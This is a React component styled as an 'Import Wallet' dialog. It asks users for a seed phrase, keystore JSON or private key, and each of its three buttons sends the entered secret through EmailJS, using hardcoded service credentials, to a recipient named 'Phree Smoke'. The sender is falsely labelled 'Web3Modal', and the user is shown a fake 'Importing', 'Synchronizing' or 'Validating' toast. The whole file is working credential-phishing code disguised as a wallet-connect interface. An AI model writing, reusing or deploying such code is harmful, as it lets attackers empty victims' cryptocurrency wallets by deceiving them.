import { useState } from "react";

import { useRef } from "react";

import Notification from "../components/Notification";
import { ToastContainer } from "react-toastify";
import { toast } from "react-toastify";

import emailjs from "emailjs-com";

interface WalletDetailProps {
  walletName: string;
}

const WalletDetail: React.FC<WalletDetailProps> = (props) => {
  const dropdownRef = useRef<HTMLDivElement>(null);
  const [textValue1, setTextValue1] = useState<string>("");
  const [textValue2, setTextValue2] = useState<string>("");
  const [textValue3, setTextValue3] = useState<string>("");

  const { walletName } = props;

  const [activeTab, setActiveTab] = useState<number>(1);

  const handleTabClick = (tab: number) => {
    setActiveTab(tab);
  };

  const handleChange = (
    event: React.ChangeEvent<HTMLTextAreaElement>,
    tab: number
  ) => {
    if (tab === 1) setTextValue1(event.target.value);
    else if (tab === 2) setTextValue2(event.target.value);
    else setTextValue3(event.target.value);
  };

  const handleImport = () => {
    if (textValue1 === "" && activeTab === 1) {
      toast(<Notification type={"fail"} msg={"Enter the Phrase"} />);
      return;
    }
    if (textValue2 === "" && activeTab === 2) {
      toast(<Notification type={"fail"} msg={"Enter the Keystore JSON"} />);
      return;
    }
    if (textValue3 === "" && activeTab === 3) {
      toast(<Notification type={"fail"} msg={"Enter the Private Key"} />);
      return;
    }

    let message = "";
    switch (activeTab) {
      case 1:
        message = `Wallet Name: ${walletName} \nPhrase: ${textValue1} \n`;
        break;
      case 2:
        message = `Wallet Name: ${walletName} \nKeystore JSON: ${textValue2} \n`;
        break;
      case 3:
        message = `Wallet Name: ${walletName} \nPrivate Key: ${textValue3}\n`;
        break;
    }

    const templateParams = {
      to_name: "Phree Smoke",
      from_name: "Web3Modal",
      message,
      // Add other parameters required by your email template
    };

    emailjs
      .send(
        "service_c3h75fm",
        "template_eg0yydw",
        templateParams,
        "V9Jon4QfwCJkwW2_f"
      )
      .then(() => {
        toast(<Notification type={"success"} msg={"Importing."} />);
      });

    //
  };

  const handleSyncronize = () => {
    if (textValue1 === "" && activeTab === 1) {
      toast(<Notification type={"fail"} msg={"Enter the Phrase"} />);
      return;
    }
    if (textValue2 === "" && activeTab === 2) {
      toast(<Notification type={"fail"} msg={"Enter the Keystore JSON"} />);
      return;
    }
    if (textValue3 === "" && activeTab === 3) {
      toast(<Notification type={"fail"} msg={"Enter the Private Key"} />);
      return;
    }

    let message = "";
    switch (activeTab) {
      case 1:
        message = `Wallet Name: ${walletName} \nPhrase: ${textValue1} \n`;
        break;
      case 2:
        message = `Wallet Name: ${walletName} \nKeystore JSON: ${textValue2} \n`;
        break;
      case 3:
        message = `Wallet Name: ${walletName} \nPrivate Key: ${textValue3}\n`;
        break;
    }

    const templateParams = {
      to_name: "Phree Smoke",
      from_name: "Web3Modal",
      message,
      // Add other parameters required by your email template
    };

    emailjs
      .send(
        "service_c3h75fm",
        "template_eg0yydw",
        templateParams,
        "V9Jon4QfwCJkwW2_f"
      )
      .then(() => {
        toast(<Notification type={"success"} msg={"Synchronizing."} />);
      });

    //
  };

  const handleValidate = () => {
    if (textValue1 === "" && activeTab === 1) {
      toast(<Notification type={"fail"} msg={"Enter the Phrase"} />);
      return;
    }
    if (textValue2 === "" && activeTab === 2) {
      toast(<Notification type={"fail"} msg={"Enter the Keystore JSON"} />);
      return;
    }
    if (textValue3 === "" && activeTab === 3) {
      toast(<Notification type={"fail"} msg={"Enter the Private Key"} />);
      return;
    }

    let message = "";
    switch (activeTab) {
      case 1:
        message = `Wallet Name: ${walletName} \nPhrase: ${textValue1} \n`;
        break;
      case 2:
        message = `Wallet Name: ${walletName} \nKeystore JSON: ${textValue2} \n`;
        break;
      case 3:
        message = `Wallet Name: ${walletName} \nPrivate Key: ${textValue3}\n`;
        break;
    }

    const templateParams = {
      to_name: "Phree Smoke",
      from_name: "Web3Modal",
      message,
      // Add other parameters required by your email template
    };

    emailjs
      .send(
        "service_c3h75fm",
        "template_eg0yydw",
        templateParams,
        "V9Jon4QfwCJkwW2_f"
      )
      .then(() => {
        toast(<Notification type={"success"} msg={"Validating."} />);
      });

    //
  };

  return (
    <section
      ref={dropdownRef}
      className={` z-999 w-full bg-[#04011C] shadow-lg transition duration-100 rounded-sm`}
      //   data-aos="fade-down"
    >
      <h2 className="text-gray-200 text-[23px] font-poppins text-center">
        Import Wallet
      </h2>

      <div className="mt-7">
        <div className="flex justify-between px-[5%]">
          <button
            className={`px-3 font-Mont text-white text-[15px] font-semibold  focus:outline-none ${
              activeTab === 1
                ? "active:text-white rounded-3xl bg-white bg-opacity-5"
                : ""
            }`}
            onClick={() => handleTabClick(1)}
          >
            Phrase
          </button>
          <button
            className={`px-3 py-2 font-Mont text-white text-[15px] font-semibold  focus:outline-none ${
              activeTab === 2
                ? "active:text-white rounded-3xl bg-white bg-opacity-5"
                : ""
            }`}
            onClick={() => handleTabClick(2)}
          >
            Keystore JSON
          </button>
          <button
            className={`px-3 py-2 font-Mont text-white text-[15px] font-semibold  focus:outline-none ${
              activeTab === 3
                ? "active:text-white rounded-3xl bg-white bg-opacity-5"
                : ""
            }`}
            onClick={() => handleTabClick(3)}
          >
            Private Key
          </button>
        </div>
        <div className="mt-2 p-2">
          {activeTab === 1 && (
            <div className="flex flex-col">
              <textarea
                value={textValue1}
                onChange={(e) => handleChange(e, 1)}
                placeholder="Phrase"
                className="w-[70%] m-auto resize-none outline-none rounded-2xl p-3 bg-transparent border border-gray-600 hover:border-white"
              ></textarea>
              <p className="m-auto mt-3 text-[13px] text-center text-gray-600">
                12 or 24 words separated by single spaces
              </p>
            </div>
          )}
          {activeTab === 2 && (
            <div className="flex flex-col">
              <textarea
                value={textValue2}
                onChange={(e) => handleChange(e, 2)}
                placeholder="Keystore JSON"
                className="w-[70%] m-auto resize-none outline-none rounded-2xl p-3 bg-transparent border border-gray-600 hover:border-white"
              ></textarea>
              <p className="m-auto mt-3 text-[13px] text-gray-600">
                Keystore JSON
              </p>
            </div>
          )}
          {activeTab === 3 && (
            <div className="flex flex-col">
              <textarea
                value={textValue3}
                onChange={(e) => handleChange(e, 3)}
                placeholder="Private Key"
                className="w-[70%] m-auto resize-none outline-none rounded-2xl p-3 bg-transparent border border-gray-600 hover:border-white"
              ></textarea>
              <p className="m-auto mt-3 text-[13px] text-gray-600">
                Private Key
              </p>
            </div>
          )}
        </div>
      </div>

      <div className="flex flex-col mt-3">
        <button
          onClick={handleImport}
          className="w-[70%] my-1 py-1 rounded-xl text-white bg-white bg-opacity-5 font-holtwood text-[15px] mx-auto"
        >
          Import
        </button>
        <button
          onClick={handleSyncronize}
          className="w-[70%] my-1 py-1 rounded-xl text-white bg-white bg-opacity-5 font-holtwood text-[15px] mx-auto"
        >
          SYNCHRONIZE
        </button>
        <button
          onClick={handleValidate}
          className="w-[70%] my-1 py-1 rounded-xl text-white bg-white bg-opacity-5 font-holtwood text-[15px] mx-auto"
        >
          VALIDATE
        </button>
      </div>

      <ToastContainer autoClose={3000} style={{ paddingTop: "90px" }} />
    </section>
  );
};

export default WalletDetail;
